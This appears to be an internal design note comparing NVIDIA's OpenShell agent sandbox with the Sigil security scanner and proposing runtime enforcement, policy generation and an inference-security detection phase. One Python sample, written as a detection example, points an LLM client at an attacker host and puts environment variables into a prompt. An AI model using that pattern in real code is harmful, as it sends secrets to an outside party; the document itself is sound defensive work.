# OpenShell Research: Lessons for Sigil

> **Data Source:** Public GitHub repository (NVIDIA/OpenShell) and official NVIDIA documentation
> **Date:** 2026-04-02
> **Purpose:** Identify patterns and capabilities from NVIDIA's OpenShell that Sigil can adapt

## What is OpenShell?

NVIDIA OpenShell is an open-source (Apache 2.0) sandboxed runtime for autonomous AI agents. Released at GTC 2026, it wraps AI coding agents (Claude Code, Codex, Copilot, etc.) in isolated containers governed by declarative YAML policies — enforcing security constraints **externally at the OS and network level** rather than relying on agent self-restraint.

The core architecture: a K3s Kubernetes cluster inside a single Docker container, with four components:

| Component | Role |
|-----------|------|
| **Gateway** | Control plane — sandbox lifecycle, auth, credential resolution, policy distribution (gRPC) |
| **Sandbox** | Isolated container runtime with kernel-level isolation per agent |
| **Policy Engine** | Multi-layer constraint enforcement (OPA/Rego + Landlock + seccomp) |
| **Privacy Router** | Intercepts LLM API calls, handles credential injection, strips sensitive headers |

**Status:** Alpha, single-player mode, ~4.3k GitHub stars.

---

## Key Insight: Sigil and OpenShell Are Complementary

**Sigil finds threats before execution (static analysis). OpenShell prevents threats during execution (runtime enforcement).**

Sigil's 8-phase scanner identifies what to block. An OpenShell-inspired runtime layer would enforce those blocks. Together they form a complete pre-execution + runtime security posture for AI agent code.

---

## Adaptable Patterns

### 1. Runtime Enforcement via `sigil sandbox` / `sigil run`

**OpenShell's approach:** Four independent enforcement layers:

- **Filesystem** — Linux Landlock LSM with explicit `read_only` / `read_write` path lists. Everything else denied. Immutable after sandbox creation.
- **Process** — seccomp-bpf syscall filtering in `pre_exec` hook. Blocks privilege escalation with EPERM/ENOSYS.
- **Network** — All traffic through a proxy in an isolated network namespace. Per-connection L4 rules + per-request L7 rules evaluated by OPA with Rego. TLS termination + MITM inspection.
- **Inference** — LLM API calls routed through `inference.local`. Credentials stripped/injected. Unrecognized patterns get 403.

**Sigil adaptation:**

```bash
# Scan first (existing), then run in sandbox (new)
sigil scan ./agent-code
sigil run --policy strict -- python agent.py

# Or one-shot: scan + sandbox
sigil safe-run ./agent-code -- python agent.py
```

Sigil already knows *what* to block from its scanner. The runtime layer would be *how* to block it. Priority: **High** (closes Sigil's biggest gap — static-only analysis).

### 2. Declarative Security Policies with Auto-Generation

**OpenShell's policy format:**

```yaml
filesystem_policy:
  include_workdir: true
  read_only: [/usr, /lib, /proc, /dev/urandom]
  read_write: [/sandbox, /tmp]
  
landlock:
  compatibility: best_effort

process:
  run_as_user: sandbox
  run_as_group: sandbox

network_policies:
  github_api:
    name: github-api-readonly
    endpoints:
      - host: api.github.com
        port: 443
        protocol: rest
        tls: terminate
        enforcement: enforce    # or "log_only" for audit mode
        access: read-only       # GET, HEAD, OPTIONS only
    binaries:
      - { path: /usr/bin/curl }
```

**Key design decisions:**
- Static sections (filesystem, process) locked at creation — immutable
- Dynamic sections (network, inference) hot-reloadable without restart
- `enforce` vs `log_only` modes for testing policies before enforcement
- Binary-specific rules (only specific executables can access an endpoint)

**Sigil adaptation:**

```bash
# Auto-generate a policy from scan results
sigil policy generate ./agent-code --output policy.yaml

# Apply during sandboxed execution
sigil run --policy policy.yaml -- python agent.py
```

Phase 3 findings → network allowlist. Phase 4 findings → credential restrictions. Phase 1 findings → filesystem lockdown. The scanner output becomes actionable enforcement config. Priority: **High**.

### 3. Credential Provider Isolation

**OpenShell's approach:** Credentials are named "provider" bundles injected as environment variables at sandbox creation. Never stored on the sandbox filesystem. Auto-discovery for recognized agents.

```bash
openshell provider create --type anthropic --from-existing
openshell sandbox create --provider anthropic -- claude
```

**Sigil adaptation:**

```bash
# Only expose specific credential sets to the agent
sigil run --provider github,anthropic -- python agent.py
# Agent sees ANTHROPIC_API_KEY and GITHUB_TOKEN, nothing else
```

This directly addresses what Phase 4 (Credentials) detects — rather than just flagging `os.environ['AWS_SECRET_KEY']` access, Sigil would prevent it. Priority: **High**.

### 4. Network Egress Control & SSRF Protection

**OpenShell's approach:**
- Minimal outbound access by default (deny-all baseline)
- L7 inspection with OPA/Rego policy evaluation per request
- SSRF protection: internal/private IP ranges blocked by default (loopback, link-local, multicast, RFC1918)
- Identity binding: policies bound to specific binaries
- Per-endpoint access presets: `http_read`, `http_write`, `dns`

**Sigil adaptation:**

Even without full sandboxing, Sigil could offer a lightweight network monitor:

```bash
# Wrap execution with network visibility
sigil monitor -- python agent.py
# Logs all outbound connections, alerts on unexpected destinations
```

This catches obfuscated exfiltration (DNS tunneling, delayed callbacks) that Phase 3 static analysis misses. Priority: **Medium** (high value but significant implementation effort).

### 5. Inference Security (New Detection Phase)

**OpenShell's approach:** All LLM API calls from sandboxed agents are intercepted via `inference.local`. Caller credentials stripped, backend credentials injected, model fields rewritten. This prevents:
- Data exfiltration through LLM API calls (embedding secrets in prompts)
- Credential theft via redirected model endpoints
- Prompt context leakage to unauthorized backends

**Sigil adaptation — Phase 10: Inference Security:**

Detection patterns:
- Agent code pointing LLM calls to unexpected/hardcoded endpoints
- Prompts constructed from sensitive data (env vars, file contents)
- API key injection or override in model client configuration
- Undeclared model provider connections

```python
# Example detection: agent sends secrets through LLM call
client = openai.OpenAI(base_url="https://attacker.com/v1")  # FLAG
prompt = f"Summarize: {os.environ}"  # FLAG: env vars in prompt
```

Priority: **Medium** (novel threat vector not currently covered).

### 6. Bypass Monitoring & Denial Aggregation

**OpenShell includes:**
- `bypass_monitor.rs` — actively monitors for attempts to circumvent sandbox restrictions
- `denial_aggregator.rs` — aggregates and reports policy denials for observability
- OCSF (Open Cybersecurity Schema Framework) integration for structured security event reporting

**Sigil adaptation:**
- Runtime scan mode that monitors for evasion attempts (e.g., agent trying to write to blocked paths, reconnecting after denied network calls)
- Structured event logging in OCSF format for enterprise SIEM integration
- Denial dashboards in the Sigil web UI showing blocked actions over time

Priority: **Low** (enterprise feature, relevant after runtime enforcement exists).

### 7. Agent Development Skills Ecosystem

**OpenShell ships 17 agent skills** in `.agents/skills/`:

| Skill | Sigil Equivalent |
|-------|-----------------|
| `generate-sandbox-policy` | `sigil policy generate` — auto-generate from scan results |
| `review-security-issue` | Deep investigation of a specific finding |
| `fix-security-issue` | Propose code fixes for detected vulnerabilities |
| `sbom` | `sigil sbom` — dependency inventory + threat cross-reference |
| `triage-issue` | Prioritize findings by exploitability |
| `build-from-issue` | Auto-remediate from GitHub issue descriptions |

Sigil already has `/scan-repo`, `/scan-package`, `/review-quarantine`. Expanding to include:
- **`/fix-finding`** — propose a code fix for a specific scan finding
- **`/generate-policy`** — output a sandbox policy from scan results
- **`/sbom`** — generate SBOM cross-referenced against known_threats.json

Priority: **Medium** (incremental, high user value).

### 8. SBOM Generation

**OpenShell's approach:** Built-in SBOM skill for software bill of materials.

**Sigil adaptation:**

```bash
sigil sbom ./project --format cyclonedx
```

- Parse lockfiles (package-lock.json, poetry.lock, Cargo.lock, requirements.txt)
- Cross-reference against `api/data/known_threats.json` (172KB of known malicious packages)
- Map to compliance frameworks via existing `compliance_frameworks.json`
- Output CycloneDX or SPDX format

Natural fit with Sigil's existing package scanning and compliance data. Priority: **Medium**.

---

## Implementation Roadmap

### Phase A: Foundation (Near-term)

1. **`sigil policy generate <path>`** — Scan a codebase and output a recommended policy YAML based on findings. Low effort, immediately useful, no runtime component needed.

2. **SBOM command** — Parse dependency files, cross-reference threat database. Leverages existing data assets.

3. **Expanded Claude Code skills** — `/fix-finding`, `/generate-policy`, `/sbom`.

### Phase B: Runtime Enforcement (Medium-term)

4. **`sigil run --policy <file> -- <command>`** — Lightweight container-based sandbox using existing Docker/Podman. Enforce filesystem and network policies derived from scan results.

5. **Credential provider system** — Named credential bundles, env-var injection, deny-by-default access to host environment.

6. **`sigil monitor`** — Network visibility wrapper using eBPF or proxy interception. Log and alert on outbound connections.

### Phase C: Advanced (Longer-term)

7. **Phase 10: Inference Security** — Static detection of LLM API misuse patterns.

8. **OCSF event logging** — Structured security events for SIEM integration.

9. **Hot-reloadable policies** — Runtime policy updates via API/dashboard.

10. **Bypass monitoring** — Active detection of sandbox evasion attempts.

---

## Architecture Comparison

```
┌─────────────────────────────────────────────────────┐
│                   SIGIL (Today)                      │
│                                                      │
│  [Code] → [8-Phase Scanner] → [Findings] → [Human]  │
│            (static analysis)    (report)    (decide)  │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│              SIGIL + OpenShell Patterns               │
│                                                      │
│  [Code] → [Scanner] → [Policy Gen] → [Sandbox]      │
│            (detect)    (translate)    (enforce)       │
│                                                      │
│  Scan findings become runtime enforcement rules:     │
│  • Phase 1 findings → filesystem lockdown            │
│  • Phase 3 findings → network allowlist              │
│  • Phase 4 findings → credential isolation           │
│  • Phase 5 findings → process restrictions           │
│  • Phase 7 findings → inference routing rules        │
└─────────────────────────────────────────────────────┘
```

---

## Technology Considerations

OpenShell's stack choices worth evaluating for Sigil:

| OpenShell Choice | Relevance to Sigil |
|-----------------|-------------------|
| Rust (2024 edition) | Sigil CLI already being ported to Rust — aligns well |
| OPA/Rego for policy evaluation | Proven policy engine, good for complex network rules |
| Landlock LSM for filesystem | Linux-only but zero-overhead; consider for Linux deployments |
| seccomp-bpf for syscalls | Lightweight process isolation without full container overhead |
| gRPC for gateway ↔ sandbox | Relevant if Sigil adds multi-sandbox orchestration |
| OCSF for security events | Industry standard, good for enterprise adoption |

---

## Key Takeaway

OpenShell validates the market need for runtime AI agent security — and it's built on the assumption that static analysis alone isn't enough. Sigil is positioned to offer **both** pre-execution scanning (which OpenShell doesn't do) and runtime enforcement (which OpenShell pioneered). The combination of "find it, then prevent it" in a single tool would be a strong differentiator.
